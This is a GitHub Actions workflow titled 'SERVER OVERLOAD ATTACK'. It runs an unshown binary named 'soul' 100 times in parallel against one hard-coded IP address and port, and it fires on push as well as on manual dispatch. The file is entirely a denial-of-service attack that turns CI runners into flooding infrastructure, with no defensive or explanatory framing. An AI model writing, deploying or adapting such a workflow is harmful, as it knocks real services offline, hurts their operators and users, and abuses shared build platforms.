name: SERVER OVERLOAD ATTACK
on: [workflow_dispatch, push]

jobs:
  server_overload:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - run: chmod +x soul
      - run: |
          for i in {1..100}; do
            ./soul 91.108.17.57 32003 200 4000 &
          done
          wait
